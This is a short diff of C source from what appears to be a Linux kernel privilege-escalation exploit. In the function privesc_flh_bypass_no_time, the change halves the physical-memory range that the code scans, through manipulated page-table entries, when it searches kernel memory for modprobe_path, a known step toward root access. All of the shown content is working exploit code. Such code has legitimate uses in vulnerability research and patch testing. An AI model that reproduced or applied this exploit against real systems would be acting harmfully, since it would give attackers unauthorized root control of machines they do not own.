@@ -423,9 +423,9 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 				unsigned long long phys_modprobe_addr;
 				unsigned long long modprobe_iteration_base;
 
-				modprobe_iteration_base = phys_kernel_base + i * 0x400000;
+				modprobe_iteration_base = phys_kernel_base + i * 0x200000;
 
-				PRINTF_VERBOSE("[*] setting physical address range to 0x%016llx - 0x%016llx\n", modprobe_iteration_base, modprobe_iteration_base + 0x400000);
+				PRINTF_VERBOSE("[*] setting physical address range to 0x%016llx - 0x%016llx\n", modprobe_iteration_base, modprobe_iteration_base + 0x200000);
 
 				// set the pages for the other threads PUD data range to kernel memory
 				for (unsigned short j=0; j < 512; j++)
@@ -436,7 +436,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 #if CONFIG_STATIC_USERMODEHELPER
 				pmd_modprobe_addr = memmem(pmd_data_area, 0x200000, CONFIG_STATIC_USERMODEHELPER_PATH, strlen(CONFIG_STATIC_USERMODEHELPER_PATH));
 #else
-				pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x400000, modprobe_path, KMOD_PATH_LEN);
+				pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x200000, modprobe_path, KMOD_PATH_LEN);
 #endif
 				if (pmd_modprobe_addr == NULL)
 					continue;
